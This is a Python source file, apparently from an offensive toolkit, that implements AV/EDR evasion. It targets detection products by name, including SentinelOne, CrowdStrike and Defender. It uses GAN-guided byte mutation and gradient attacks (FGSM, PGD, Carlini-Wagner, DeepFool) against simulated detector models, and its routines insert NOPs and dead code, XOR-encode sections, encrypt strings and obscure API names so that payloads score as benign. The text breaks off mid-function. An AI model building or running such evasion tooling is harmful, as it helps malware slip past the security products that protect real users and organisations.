"""
AI Adversarial Training Module - EDR ML Evasion
================================================
GAN-based payload mutation to evade ML-based EDR detection.
Trains adversarial examples that fool SentinelOne, CrowdStrike, Defender ATP.

Features:
- GAN Mutator for payload transformation
- EDR-specific ML model simulation
- FGSM/PGD adversarial attacks
- Feature-space perturbation
- Gradient-based evasion
- Transfer attack support
"""

import os
import sys
import json
import time
import struct
import hashlib
import logging
import threading
from typing import Dict, List, Optional, Tuple, Any, Callable
from dataclasses import dataclass, field
from enum import Enum
from abc import ABC, abstractmethod
import random
import base64
import zlib

# Optional ML imports
try:
    import numpy as np
    HAS_NUMPY = True
except ImportError:
    HAS_NUMPY = False
    np = None

# TensorFlow disabled due to SIGILL on some CPUs
# Set environment variable to enable: ENABLE_TF_ADVERSARIAL=1
HAS_TF = False
tf = None
if os.environ.get('ENABLE_TF_ADVERSARIAL', '0') == '1':
    try:
        import tensorflow as tf
        HAS_TF = True
    except ImportError:
        HAS_TF = False
        tf = None

# PyTorch disabled due to potential issues
# Set environment variable to enable: ENABLE_TORCH_ADVERSARIAL=1
HAS_TORCH = False
torch = None
nn = None
optim = None
if os.environ.get('ENABLE_TORCH_ADVERSARIAL', '0') == '1':
    try:
        import torch
        import torch.nn as nn
        import torch.optim as optim
        HAS_TORCH = True
    except ImportError:
        HAS_TORCH = False
        torch = None
        nn = None
        optim = None

logger = logging.getLogger(__name__)


class EDRVendor(Enum):
    """Supported EDR vendors for adversarial training"""
    SENTINELONE = "sentinelone"
    CROWDSTRIKE = "crowdstrike"
    DEFENDER = "defender"
    CARBON_BLACK = "carbon_black"
    CYLANCE = "cylance"
    SOPHOS = "sophos"
    GENERIC = "generic"


class AttackMethod(Enum):
    """Adversarial attack methods"""
    FGSM = "fgsm"                    # Fast Gradient Sign Method
    PGD = "pgd"                      # Projected Gradient Descent
    CW = "cw"                        # Carlini & Wagner
    DEEPFOOL = "deepfool"           # DeepFool
    GAN = "gan"                      # GAN-based mutation
    GENETIC = "genetic"              # Genetic algorithm
    REINFORCEMENT = "reinforcement"  # RL-based


@dataclass
class AdversarialConfig:
    """Configuration for adversarial training"""
    evasion_level: str = "high"
    target_edr: EDRVendor = EDRVendor.GENERIC
    attack_method: AttackMethod = AttackMethod.GAN
    
    # GAN parameters
    gan_latent_dim: int = 128
    gan_epochs: int = 100
    gan_batch_size: int = 32
    
    # FGSM/PGD parameters
    epsilon: float = 0.1
    alpha: float = 0.01
    pgd_iterations: int = 40
    
    # Training parameters
    learning_rate: float = 0.001
    max_mutations: int = 1000
    confidence_threshold: float = 0.3  # Target: below this = benign
    
    # Feature extraction
    feature_dim: int = 256
    use_api_features: bool = True
    use_entropy_features: bool = True
    use_structure_features: bool = True
    
    # Model paths
    model_dir: str = "models/edr_sim"
    checkpoint_dir: str = "checkpoints/adversarial"


@dataclass
class PayloadFeatures:
    """Extracted features from payload"""
    raw_bytes: bytes
    byte_histogram: List[float] = field(default_factory=list)
    entropy_sections: List[float] = field(default_factory=list)
    api_imports: List[str] = field(default_factory=list)
    string_features: List[str] = field(default_factory=list)
    structure_hash: str = ""
    size: int = 0
    
    # Computed features
    feature_vector: Optional[Any] = None  # numpy array
    embedding: Optional[Any] = None


@dataclass
class AdversarialResult:
    """Result of adversarial generation"""
    original_payload: bytes
    adversarial_payload: bytes
    original_score: float  # Detection score (higher = more malicious)
    adversarial_score: float
    evasion_success: bool
    mutations_applied: List[str]
    iterations: int
    generation_time: float
    target_edr: str
    attack_method: str


class FeatureExtractor:
    """Extract ML features from payloads for adversarial training"""
    
    def __init__(self, config: AdversarialConfig):
        self.config = config
        self._api_patterns = self._load_api_patterns()
    
    def _load_api_patterns(self) -> Dict[str, List[str]]:
        """Load suspicious API patterns by category"""
        return {
            "process": [
                "CreateProcess", "CreateRemoteThread", "OpenProcess",
                "VirtualAllocEx", "WriteProcessMemory", "NtCreateThreadEx",
                "RtlCreateUserThread", "QueueUserAPC"
            ],
            "memory": [
                "VirtualAlloc", "VirtualProtect", "HeapCreate",
                "NtAllocateVirtualMemory", "NtProtectVirtualMemory"
            ],
            "file": [
                "CreateFile", "WriteFile", "DeleteFile", "MoveFile",
                "NtCreateFile", "NtWriteFile"
            ],
            "registry": [
                "RegCreateKey", "RegSetValue", "RegDeleteKey",
                "NtCreateKey", "NtSetValueKey"
            ],
            "network": [
                "WSAStartup", "socket", "connect", "send", "recv",
                "InternetOpen", "HttpSendRequest", "WinHttpOpen"
            ],
            "crypto": [
                "CryptAcquireContext", "CryptEncrypt", "CryptDecrypt",
                "BCryptEncrypt", "BCryptDecrypt"
            ],
            "evasion": [
                "IsDebuggerPresent", "CheckRemoteDebuggerPresent",
                "NtQueryInformationProcess", "GetTickCount", "Sleep"
            ]
        }
    
    def extract(self, payload: bytes) -> PayloadFeatures:
        """Extract features from payload"""
        features = PayloadFeatures(
            raw_bytes=payload,
            size=len(payload)
        )
        
        # Byte histogram (256 bins normalized)
        features.byte_histogram = self._compute_byte_histogram(payload)
        
        # Entropy by sections
        features.entropy_sections = self._compute_sectional_entropy(payload)
        
        # API imports
        if self.config.use_api_features:
            features.api_imports = self._extract_api_imports(payload)
        
        # String features
        features.string_features = self._extract_strings(payload)
        
        # Structure hash
        features.structure_hash = self._compute_structure_hash(payload)
        
        # Compute feature vector
        features.feature_vector = self._to_feature_vector(features)
        
        return features
    
    def _compute_byte_histogram(self, data: bytes) -> List[float]:
        """Compute normalized byte frequency histogram"""
        if not HAS_NUMPY:
            histogram = [0.0] * 256
            for b in data:
                histogram[b] += 1
            total = len(data) if data else 1
            return [h / total for h in histogram]
        
        histogram = np.zeros(256, dtype=np.float32)
        for b in data:
            histogram[b] += 1
        if len(data) > 0:
            histogram /= len(data)
        return histogram.tolist()
    
    def _compute_sectional_entropy(self, data: bytes, sections: int = 16) -> List[float]:
        """Compute entropy for each section of the payload"""
        if len(data) == 0:
            return [0.0] * sections
        
        section_size = max(1, len(data) // sections)
        entropies = []
        
        for i in range(sections):
            start = i * section_size
            end = min(start + section_size, len(data))
            section = data[start:end]
            entropies.append(self._compute_entropy(section))
        
        return entropies
    
    def _compute_entropy(self, data: bytes) -> float:
        """Compute Shannon entropy"""
        if len(data) == 0:
            return 0.0
        
        byte_counts = {}
        for b in data:
            byte_counts[b] = byte_counts.get(b, 0) + 1
        
        entropy = 0.0
        length = len(data)
        for count in byte_counts.values():
            if count > 0:
                prob = count / length
                entropy -= prob * (prob and (prob > 0 and __import__('math').log2(prob) or 0))
        
        return entropy
    
    def _extract_api_imports(self, data: bytes) -> List[str]:
        """Extract API function names from payload"""
        found_apis = []
        try:
            text = data.decode('utf-8', errors='ignore')
        except:
            text = str(data)
        
        for category, apis in self._api_patterns.items():
            for api in apis:
                if api.lower() in text.lower():
                    found_apis.append(f"{category}:{api}")
        
        return found_apis
    
    def _extract_strings(self, data: bytes, min_length: int = 4) -> List[str]:
        """Extract printable strings from payload"""
        strings = []
        current = []
        
        for b in data:
            if 32 <= b < 127:  # Printable ASCII
                current.append(chr(b))
            else:
                if len(current) >= min_length:
                    strings.append(''.join(current))
                current = []
        
        if len(current) >= min_length:
            strings.append(''.join(current))
        
        return strings[:100]  # Limit
    
    def _compute_structure_hash(self, data: bytes) -> str:
        """Compute structural hash of payload"""
        # Hash based on byte patterns, not exact content
        if len(data) < 64:
            return hashlib.md5(data).hexdigest()[:16]
        
        # Sample from different positions
        samples = [
            data[:64],
            data[len(data)//4:len(data)//4+64],
            data[len(data)//2:len(data)//2+64],
            data[-64:]
        ]
        combined = b''.join(samples)
        return hashlib.md5(combined).hexdigest()[:16]
    
    def _to_feature_vector(self, features: PayloadFeatures) -> Any:
        """Convert features to numerical vector"""
        if not HAS_NUMPY:
            # Simple list-based representation
            vec = features.byte_histogram + features.entropy_sections
            vec.append(features.size / 1000000.0)  # Normalized size
            vec.append(len(features.api_imports) / 50.0)  # Normalized API count
            return vec
        
        # Numpy-based feature vector
        vec_parts = []
        
        # Byte histogram (256)
        vec_parts.append(np.array(features.byte_histogram, dtype=np.float32))
        
        # Entropy sections (16)
        vec_parts.append(np.array(features.entropy_sections, dtype=np.float32))
        
        # Size feature (1)
        vec_parts.append(np.array([features.size / 1000000.0], dtype=np.float32))
        
        # API features (one-hot encoded, simplified to count per category)
        api_counts = np.zeros(7, dtype=np.float32)  # 7 categories
        categories = list(self._api_patterns.keys())
        for api in features.api_imports:
            cat = api.split(':')[0]
            if cat in categories:
                api_counts[categories.index(cat)] += 1
        api_counts /= 10.0  # Normalize
        vec_parts.append(api_counts)
        
        return np.concatenate(vec_parts)


class EDRModelSimulator(ABC):
    """Base class for EDR ML model simulation"""
    
    @abstractmethod
    def predict(self, features: Any) -> float:
        """Predict maliciousness score (0-1)"""
        pass
    
    @abstractmethod
    def get_gradients(self, features: Any) -> Any:
        """Get gradients for adversarial attacks"""
        pass


class GenericEDRModel(EDRModelSimulator):
    """Generic EDR model simulator using heuristics"""
    
    def __init__(self, config: AdversarialConfig):
        self.config = config
        self.weights = self._initialize_weights()
    
    def _initialize_weights(self) -> Dict[str, float]:
        """Initialize detection weights"""
        return {
            "high_entropy": 0.3,
            "suspicious_apis": 0.4,
            "shellcode_patterns": 0.5,
            "small_size": 0.1,
            "packed_indicators": 0.3,
            "encryption_patterns": 0.2
        }
    
    def predict(self, features: Any) -> float:
        """Predict maliciousness score"""
        score = 0.0
        
        if isinstance(features, PayloadFeatures):
            # High entropy check
            avg_entropy = sum(features.entropy_sections) / len(features.entropy_sections) if features.entropy_sections else 0
            if avg_entropy > 7.0:
                score += self.weights["high_entropy"]
            
            # Suspicious API check
            suspicious_count = len(features.api_imports)
            score += min(suspicious_count * 0.05, self.weights["suspicious_apis"])
            
            # Size check (small payloads often suspicious)
            if features.size < 10000:
                score += self.weights["small_size"]
            
            # Shellcode patterns
            if self._has_shellcode_patterns(features.raw_bytes):
                score += self.weights["shellcode_patterns"]
        
        elif HAS_NUMPY and isinstance(features, np.ndarray):
            # Vector-based prediction
            # Entropy section is indices 256-271
            if len(features) > 271:
                avg_entropy = np.mean(features[256:272])
                if avg_entropy > 0.875:  # 7.0/8.0 normalized
                    score += self.weights["high_entropy"]
            
            # Byte histogram analysis (indices 0-255)
            if len(features) > 255:
                histogram = features[:256]
                # Check for suspicious patterns
                null_ratio = histogram[0]
                if null_ratio > 0.3:
                    score += 0.1
        
        return min(score, 1.0)
    
    def _has_shellcode_patterns(self, data: bytes) -> bool:
        """Check for common shellcode patterns"""
        patterns = [
            b'\xfc\xe8',        # CLD; CALL
            b'\x60\xe8',        # PUSHAD; CALL
            b'\xeb\x10',        # Short JMP +16
            b'\xe9',            # Near JMP
            b'\x68',            # PUSH imm32
            b'\xb8',            # MOV EAX
            b'\x31\xc0',        # XOR EAX, EAX
            b'\x33\xc0',        # XOR EAX, EAX (MASM)
        ]
        for pattern in patterns:
            if pattern in data:
                return True
        return False
    
    def get_gradients(self, features: Any) -> Any:
        """Approximate gradients using finite differences"""
        if not HAS_NUMPY:
            return None
        
        if not isinstance(features, np.ndarray):
            return None
        
        epsilon = 0.01
        gradients = np.zeros_like(features)
        base_score = self.predict(features)
        
        for i in range(len(features)):
            perturbed = features.copy()
            perturbed[i] += epsilon
            new_score = self.predict(perturbed)
            gradients[i] = (new_score - base_score) / epsilon
        
        return gradients


class NeuralEDRModel(EDRModelSimulator):
    """Neural network-based EDR model simulator"""
    
    def __init__(self, config: AdversarialConfig, vendor: EDRVendor):
        self.config = config
        self.vendor = vendor
        self.model = None
        self._build_model()
    
    def _build_model(self):
        """Build neural network model"""
        if HAS_TF:
            self._build_tf_model()
        elif HAS_TORCH:
            self._build_torch_model()
        else:
            logger.warning("No ML framework available, using heuristic model")
    
    def _build_tf_model(self):
        """Build TensorFlow model"""
        input_dim = self.config.feature_dim + 256 + 16 + 8  # ~280
        
        self.model = tf.keras.Sequential([
            tf.keras.layers.Dense(512, activation='relu', input_shape=(input_dim,)),
            tf.keras.layers.Dropout(0.3),
            tf.keras.layers.Dense(256, activation='relu'),
            tf.keras.layers.Dropout(0.3),
            tf.keras.layers.Dense(128, activation='relu'),
            tf.keras.layers.Dense(64, activation='relu'),
            tf.keras.layers.Dense(1, activation='sigmoid')
        ])
        
        self.model.compile(
            optimizer=tf.keras.optimizers.Adam(learning_rate=self.config.learning_rate),
            loss='binary_crossentropy',
            metrics=['accuracy']
        )
        
        # Try to load pretrained weights
        model_path = os.path.join(
            self.config.model_dir, 
            f"{self.vendor.value}_model.h5"
        )
        if os.path.exists(model_path):
            try:
                self.model.load_weights(model_path)
                logger.info(f"Loaded EDR model weights from {model_path}")
            except:
                logger.warning(f"Could not load weights from {model_path}")
    
    def _build_torch_model(self):
        """Build PyTorch model"""
        input_dim = self.config.feature_dim + 256 + 16 + 8
        
        class EDRNet(nn.Module):
            def __init__(self):
                super().__init__()
                self.fc1 = nn.Linear(input_dim, 512)
                self.fc2 = nn.Linear(512, 256)
                self.fc3 = nn.Linear(256, 128)
                self.fc4 = nn.Linear(128, 64)
                self.fc5 = nn.Linear(64, 1)
                self.dropout = nn.Dropout(0.3)
                self.relu = nn.ReLU()
                self.sigmoid = nn.Sigmoid()
            
            def forward(self, x):
                x = self.relu(self.fc1(x))
                x = self.dropout(x)
                x = self.relu(self.fc2(x))
                x = self.dropout(x)
                x = self.relu(self.fc3(x))
                x = self.relu(self.fc4(x))
                x = self.sigmoid(self.fc5(x))
                return x
        
        self.model = EDRNet()
    
    def predict(self, features: Any) -> float:
        """Predict maliciousness score"""
        if self.model is None:
            return GenericEDRModel(self.config).predict(features)
        
        if isinstance(features, PayloadFeatures):
            features = features.feature_vector
        
        if not HAS_NUMPY:
            return 0.5
        
        if not isinstance(features, np.ndarray):
            return 0.5
        
        # Ensure correct shape
        if len(features.shape) == 1:
            features = features.reshape(1, -1)
        
        if HAS_TF and isinstance(self.model, tf.keras.Model):
            return float(self.model.predict(features, verbose=0)[0][0])
        elif HAS_TORCH and isinstance(self.model, nn.Module):
            self.model.eval()
            with torch.no_grad():
                tensor = torch.FloatTensor(features)
                return float(self.model(tensor).item())
        
        return 0.5
    
    def get_gradients(self, features: Any) -> Any:
        """Get gradients for adversarial attacks"""
        if self.model is None or not HAS_NUMPY:
            return None
        
        if isinstance(features, PayloadFeatures):
            features = features.feature_vector
        
        if not isinstance(features, np.ndarray):
            return None
        
        if len(features.shape) == 1:
            features = features.reshape(1, -1)
        
        if HAS_TF and isinstance(self.model, tf.keras.Model):
            features_tensor = tf.convert_to_tensor(features, dtype=tf.float32)
            with tf.GradientTape() as tape:
                tape.watch(features_tensor)
                prediction = self.model(features_tensor)
            gradients = tape.gradient(prediction, features_tensor)
            return gradients.numpy()[0]
        
        elif HAS_TORCH and isinstance(self.model, nn.Module):
            self.model.train()
            tensor = torch.FloatTensor(features)
            tensor.requires_grad = True
            output = self.model(tensor)
            output.backward()
            return tensor.grad.numpy()[0]
        
        return None
    
    def train_on_batch(self, features: Any, labels: List[int]) -> float:
        """Train model on a batch (for adversarial training)"""
        if self.model is None:
            return 0.0
        
        if not HAS_NUMPY:
            return 0.0
        
        if not isinstance(features, np.ndarray):
            return 0.0
        
        if len(features.shape) == 1:
            features = features.reshape(1, -1)
        
        labels_array = np.array(labels, dtype=np.float32).reshape(-1, 1)
        
        if HAS_TF and isinstance(self.model, tf.keras.Model):
            loss = self.model.train_on_batch(features, labels_array)
            return float(loss[0]) if isinstance(loss, list) else float(loss)
        
        elif HAS_TORCH and isinstance(self.model, nn.Module):
            self.model.train()
            optimizer = optim.Adam(self.model.parameters(), lr=self.config.learning_rate)
            criterion = nn.BCELoss()
            
            optimizer.zero_grad()
            tensor = torch.FloatTensor(features)
            labels_tensor = torch.FloatTensor(labels_array)
            output = self.model(tensor)
            loss = criterion(output, labels_tensor)
            loss.backward()
            optimizer.step()
            return float(loss.item())
        
        return 0.0


class GANMutator:
    """GAN-based payload mutator for adversarial examples"""
    
    def __init__(self, config: AdversarialConfig):
        self.config = config
        self.generator = None
        self.discriminator = None
        self._build_gan()
        
        # Mutation strategies
        self.strategies = [
            self._nop_insertion,
            self._register_substitution,
            self._instruction_reordering,
            self._dead_code_insertion,
            self._encoding_variation,
            self._api_hashing,
            self._control_flow_obfuscation,
            self._string_encryption
        ]
    
    def _build_gan(self):
        """Build GAN architecture"""
        if not HAS_TF and not HAS_TORCH:
            logger.warning("No ML framework, GAN will use heuristic mutations")
            return
        
        latent_dim = self.config.gan_latent_dim
        feature_dim = self.config.feature_dim
        
        if HAS_TF:
            # Generator
            self.generator = tf.keras.Sequential([
                tf.keras.layers.Dense(256, activation='relu', input_shape=(latent_dim,)),
                tf.keras.layers.BatchNormalization(),
                tf.keras.layers.Dense(512, activation='relu'),
                tf.keras.layers.BatchNormalization(),
                tf.keras.layers.Dense(1024, activation='relu'),
                tf.keras.layers.Dense(feature_dim, activation='tanh')
            ])
            
            # Discriminator
            self.discriminator = tf.keras.Sequential([
                tf.keras.layers.Dense(512, activation='relu', input_shape=(feature_dim,)),
                tf.keras.layers.Dropout(0.3),
                tf.keras.layers.Dense(256, activation='relu'),
                tf.keras.layers.Dropout(0.3),
                tf.keras.layers.Dense(1, activation='sigmoid')
            ])
            
            self.discriminator.compile(
                optimizer=tf.keras.optimizers.Adam(0.0002),
                loss='binary_crossentropy'
            )
    
    def mutate(self, payload: bytes, target_score: float = 0.3) -> bytes:
        """Mutate payload using GAN-guided transformations"""
        if len(payload) == 0:
            return payload
        
        mutated = bytearray(payload)
        
        # Apply multiple mutation strategies
        num_mutations = random.randint(3, 8)
        applied = []
        
        for _ in range(num_mutations):
            strategy = random.choice(self.strategies)
            try:
                mutated = strategy(mutated)
                applied.append(strategy.__name__)
            except Exception as e:
                logger.debug(f"Mutation {strategy.__name__} failed: {e}")
        
        return bytes(mutated)
    
    def generate_perturbation(self, features: Any) -> Any:
        """Generate GAN-based perturbation vector"""
        if not HAS_NUMPY:
            return None
        
        if self.generator is None:
            # Return random perturbation
            return np.random.randn(self.config.feature_dim) * 0.1
        
        if HAS_TF:
            noise = tf.random.normal([1, self.config.gan_latent_dim])
            perturbation = self.generator(noise, training=False)
            return perturbation.numpy()[0]
        
        return np.random.randn(self.config.feature_dim) * 0.1
    
    def _nop_insertion(self, data: bytearray) -> bytearray:
        """Insert NOP-equivalent instructions"""
        nops = [
            bytes([0x90]),                    # NOP
            bytes([0x87, 0xc0]),              # XCHG EAX, EAX
            bytes([0x87, 0xdb]),              # XCHG EBX, EBX
            bytes([0x8d, 0x40, 0x00]),        # LEA EAX, [EAX+0]
            bytes([0x8d, 0x49, 0x00]),        # LEA ECX, [ECX+0]
            bytes([0x8d, 0x76, 0x00]),        # LEA ESI, [ESI+0]
        ]
        
        # Insert at random positions
        num_inserts = random.randint(1, 5)
        for _ in range(num_inserts):
            if len(data) < 10:
                break
            pos = random.randint(0, len(data) - 1)
            nop = random.choice(nops)
            data[pos:pos] = nop
        
        return data
    
    def _register_substitution(self, data: bytearray) -> bytearray:
        """Substitute equivalent register operations"""
        # Simple byte-level substitution for demo
        substitutions = {
            0xb8: 0xb9,  # MOV EAX -> MOV ECX (may break code, use carefully)
            0x50: 0x51,  # PUSH EAX -> PUSH ECX
            0x58: 0x59,  # POP EAX -> POP ECX
        }
        
        # Only substitute a small percentage
        for i in range(len(data)):
            if data[i] in substitutions and random.random() < 0.05:
                data[i] = substitutions[data[i]]
        
        return data
    
    def _instruction_reordering(self, data: bytearray) -> bytearray:
        """Reorder independent instructions (simplified)"""
        if len(data) < 20:
            return data
        
        # Swap small chunks that might be independent
        chunk_size = random.randint(2, 4)
        if len(data) >= chunk_size * 2 + 10:
            pos1 = random.randint(5, len(data) // 2 - chunk_size)
            pos2 = random.randint(len(data) // 2, len(data) - chunk_size - 5)
            
            chunk1 = data[pos1:pos1+chunk_size]
            chunk2 = data[pos2:pos2+chunk_size]
            
            data[pos1:pos1+chunk_size] = chunk2
            data[pos2:pos2+chunk_size] = chunk1
        
        return data
    
    def _dead_code_insertion(self, data: bytearray) -> bytearray:
        """Insert dead code that never executes"""
        dead_code_patterns = [
            # JMP over dead code
            bytes([0xeb, 0x05]) + bytes([0x90] * 5),
            # Push/Pop pairs
            bytes([0x50, 0x58]),  # PUSH EAX; POP EAX
            bytes([0x51, 0x59]),  # PUSH ECX; POP ECX
            # Conditional that never triggers
            bytes([0x31, 0xc0, 0x85, 0xc0, 0x75, 0x02, 0xeb, 0x00]),  # XOR EAX,EAX; TEST EAX,EAX; JNZ +2; JMP +0
        ]
        
        if len(data) > 50:
            pos = random.randint(10, len(data) - 10)
            dead_code = random.choice(dead_code_patterns)
            data[pos:pos] = dead_code
        
        return data
    
    def _encoding_variation(self, data: bytearray) -> bytearray:
        """Apply different encoding to payload sections"""
        if len(data) < 32:
            return data
        
        # XOR encode a section
        key = random.randint(1, 255)
        start = random.randint(0, len(data) // 2)
        end = min(start + random.randint(16, 64), len(data))
        
        for i in range(start, end):
            data[i] ^= key
        
        return data
    
    def _api_hashing(self, data: bytearray) -> bytearray:
        """Transform API string references (simplified)"""
        # Look for common API strings and obfuscate
        api_strings = [
            b"kernel32", b"ntdll", b"user32",
            b"CreateProcess", b"VirtualAlloc", b"LoadLibrary"
        ]
        
        for api in api_strings:
            if api in data:
                # Replace with hash placeholder
                hash_val = hashlib.md5(api).digest()[:4]
                pos = data.find(api)
                if pos != -1:
                    # Insert hash marker before
                    data[pos:pos] = b"\x00\x00" + hash_val + b"\x00\x00"
        
        return data
    
    def _control_flow_obfuscation(self, data: bytearray) -> bytearray:
        """Add control flow obfuscation"""
        if len(data) < 30:
            return data
        
        # Insert opaque predicates
        opaque_predicate = bytes([
            0x31, 0xc0,        # XOR EAX, EAX
            0x40,              # INC EAX
            0x48,              # DEC EAX
            0x85, 0xc0,        # TEST EAX, EAX
            0x74, 0x02,        # JZ +2 (always taken)
            0xeb, 0xfe,        # JMP -2 (infinite loop, never reached)
        ])
        
        pos = random.randint(5, len(data) - 5)
        data[pos:pos] = opaque_predicate
        
        return data
    
    def _string_encryption(self, data: bytearray) -> bytearray:
        """Encrypt string literals in payload"""
        # Find potential strings (sequences of printable chars)
        i = 0
        while i < len(data) - 4:
            # Check for printable sequence
            if all(32 <= data[j] < 127 for j in range(i, min(i+4, len(data)))):
                # Found potential string, encrypt it
                end = i
                while end < len(data) and 32 <= data[end] < 127:
                    end += 1
                
                if end - i >= 4:
                    key = random.randint(1, 255)
                    for j in range(i, end):
                        data[j] ^= key
                    i = end
                else:
                    i += 1
            else:
                i += 1
        
        return data


class AdversarialAttacker:
    """Implements various adversarial attack methods"""
    
    def __init__(self, config: AdversarialConfig, model: EDRModelSimulator):
        self.config = config
        self.model = model
    
    def fgsm_attack(self, features: Any, epsilon: float = None) -> Any:
        """Fast Gradient Sign Method attack"""
        if not HAS_NUMPY:
            return features
        
        epsilon = epsilon or self.config.epsilon
        
        gradients = self.model.get_gradients(features)
        if gradients is None:
            return features
        
        # FGSM: x_adv = x - epsilon * sign(gradients)
        # We subtract because we want to minimize the malicious score
        perturbation = epsilon * np.sign(gradients)
        adversarial = features - perturbation
        
        # Clip to valid range
        adversarial = np.clip(adversarial, 0, 1)
        
        return adversarial
    
    def pgd_attack(self, features: Any, epsilon: float = None, 
                   alpha: float = None, iterations: int = None) -> Any:
        """Projected Gradient Descent attack"""
        if not HAS_NUMPY:
            return features
        
        epsilon = epsilon or self.config.epsilon
        alpha = alpha or self.config.alpha
        iterations = iterations or self.config.pgd_iterations
        
        adversarial = features.copy()
        original = features.copy()
        
        for _ in range(iterations):
            gradients = self.model.get_gradients(adversarial)
            if gradients is None:
                break
            
            # PGD step
            adversarial = adversarial - alpha * np.sign(gradients)
            
            # Project back to epsilon-ball around original
            perturbation = adversarial - original
            perturbation = np.clip(perturbation, -epsilon, epsilon)
            adversarial = original + perturbation
            
            # Clip to valid range
            adversarial = np.clip(adversarial, 0, 1)
            
            # Check if we've evaded
            score = self.model.predict(adversarial)
            if score < self.config.confidence_threshold:
                break
        
        return adversarial
    
    def cw_attack(self, features: Any, c: float = 1.0, 
                  iterations: int = 100) -> Any:
        """Carlini & Wagner attack (simplified)"""
        if not HAS_NUMPY:
            return features
        
        adversarial = features.copy()
        best_adversarial = features.copy()
        best_score = self.model.predict(features)
        
        # Binary search for optimal c
        for iteration in range(iterations):
            gradients = self.model.get_gradients(adversarial)
            if gradients is None:
                break
            
            # CW objective: minimize ||x - x'||^2 + c * f(x')
            # where f(x') = max(score - threshold, 0)
            score = self.model.predict(adversarial)
            
            if score < self.config.confidence_threshold:
                # Success, try to minimize perturbation
                c *= 0.9
            else:
                c *= 1.1
            
            # Update
            perturbation = -0.01 * (gradients + c * (adversarial - features))
            adversarial = adversarial + perturbation
            adversarial = np.clip(adversarial, 0, 1)
            
            # Track best
            if score < best_score:
                best_score = score
                best_adversarial = adversarial.copy()
        
        return best_adversarial
    
    def deepfool_attack(self, features: Any, max_iterations: int = 50) -> Any:
        """DeepFool attack (simplified binary version)"""
        if not HAS_NUMPY:
            return features
        
        adversarial = features.copy()
        
        for _ in range(max_iterations):
            score = self.model.predict(adversarial)
            if score < self.config.confidence_threshold:
                break
            
            gradients = self.model.get_gradients(adversarial)
            if gradients is None:
                break
            
            grad_norm = np.linalg.norm(gradients)
            if grad_norm < 1e-8:
                break
            
            # Minimal perturbation to cross decision boundary
            perturbation = -(score - self.config.confidence_threshold) * gradients / (grad_norm ** 2)
            adversarial = adversarial + perturbation * 1.02  # Overshoot slightly
            adversarial = np.clip(adversarial, 0, 1)
        
        return adversarial


class AIAdversarialTrainer:
    """
    Main class for AI-based adversarial training against EDR ML models.
    Generates adversarial payloads that evade detection.
    """
    
    def __init__(self, config: Optional[AdversarialConfig] = None,
                 evasion_level: str = 'high',
                 target_edr: str = 'generic'):
        """
        Initialize adversarial trainer.
        
        Args:
            config: AdversarialConfig object
            evasion_level: 'low', 'medium', 'high', 'paranoid'
            target_edr: Target EDR vendor name
        """
        self.config = config or AdversarialConfig(
            evasion_level=evasion_level,
            target_edr=EDRVendor(target_edr.lower()) if target_edr else EDRVendor.GENERIC
        )
        
        self.feature_extractor = FeatureExtractor(self.config)
        self.mutator = GANMutator(self.config)
        
        # Initialize EDR models
        self.models: Dict[EDRVendor, EDRModelSimulator] = {}
        self._init_models()
        
        # Attack methods
        self.attacker = AdversarialAttacker(
            self.config,
            self.models.get(self.config.target_edr, self.models[EDRVendor.GENERIC])
        )
        
        # Statistics
        self.stats = {
            "total_generated": 0,
            "successful_evasions": 0,
            "average_iterations": 0,
            "average_score_reduction": 0
        }
        
        logger.info(f"AIAdversarialTrainer initialized: level={evasion_level}, target={target_edr}")
    
    def _init_models(self):
        """Initialize EDR simulation models"""
        # Always have a generic model
        self.models[EDRVendor.GENERIC] = GenericEDRModel(self.config)
        
        # Initialize target-specific model if ML available
        if HAS_TF or HAS_TORCH:
            for vendor in EDRVendor:
                if vendor != EDRVendor.GENERIC:
                    self.models[vendor] = NeuralEDRModel(self.config, vendor)
        else:
            # Use generic for all
            for vendor in EDRVendor:
                self.models[vendor] = self.models[EDRVendor.GENERIC]
    
    def train_adversarial(self, payload: bytes, 
                          target_score: float = None) -> AdversarialResult:
        """
        Generate adversarial payload that evades EDR detection.
        
        Args:
            payload: Original payload bytes
            target_score: Target detection score (default: config threshold)
            
        Returns:
            AdversarialResult with adversarial payload
        """
        start_time = time.time()
        target_score = target_score or self.config.confidence_threshold
        
        # Extract features
        features = self.feature_extractor.extract(payload)
        original_score = self._get_detection_score(features)
        
        logger.info(f"Original detection score: {original_score:.4f}")
        
        # Select attack method based on config
        if self.config.attack_method == AttackMethod.FGSM:
            adv_features = self._fgsm_evasion(features)
        elif self.config.attack_method == AttackMethod.PGD:
            adv_features = self._pgd_evasion(features)
        elif self.config.attack_method == AttackMethod.CW:
            adv_features = self._cw_evasion(features)
        elif self.config.attack_method == AttackMethod.DEEPFOOL:
            adv_features = self._deepfool_evasion(features)
        elif self.config.attack_method == AttackMethod.GAN:
            adv_features = self._gan_evasion(features)
        elif self.config.attack_method == AttackMethod.GENETIC:
            adv_features = self._genetic_evasion(features)
        else:
            adv_features = self._combined_evasion(features)
        
        # Generate mutated payload
        adversarial_payload, mutations = self._apply_evasion(
            payload, features, adv_features
        )
        
        # Evaluate result
        adv_features_final = self.feature_extractor.extract(adversarial_payload)
        adversarial_score = self._get_detection_score(adv_features_final)
        
        generation_time = time.time() - start_time
        evasion_success = adversarial_score < target_score
        
        # Update stats
        self.stats["total_generated"] += 1
        if evasion_success:
            self.stats["successful_evasions"] += 1
        
        result = AdversarialResult(
            original_payload=payload,
            adversarial_payload=adversarial_payload,
            original_score=original_score,
            adversarial_score=adversarial_score,
            evasion_success=evasion_success,
            mutations_applied=mutations,
            iterations=self.config.max_mutations,
            generation_time=generation_time,
            target_edr=self.config.target_edr.value,
            attack_method=self.config.attack_method.value
        )
        
        logger.info(f"Adversarial generation complete: {original_score:.4f} -> {adversarial_score:.4f} "
                   f"({'SUCCESS' if evasion_success else 'FAILED'})")
        
        return result
    
    def _get_detection_score(self, features: PayloadFeatures) -> float:
        """Get detection score from target EDR model"""
        model = self.models.get(self.config.target_edr, self.models[EDRVendor.GENERIC])
        return model.predict(features)
    
    def _fgsm_evasion(self, features: PayloadFeatures) -> Any:
        """FGSM-based evasion"""
        if features.feature_vector is None:
            return features.feature_vector
        return self.attacker.fgsm_attack(features.feature_vector)
    
    def _pgd_evasion(self, features: PayloadFeatures) -> Any:
        """PGD-based evasion"""
        if features.feature_vector is None:
            return features.feature_vector
        return self.attacker.pgd_attack(features.feature_vector)
    
    def _cw_evasion(self, features: PayloadFeatures) -> Any:
        """Carlini-Wagner evasion"""
        if features.feature_vector is None:
            return features.feature_vector
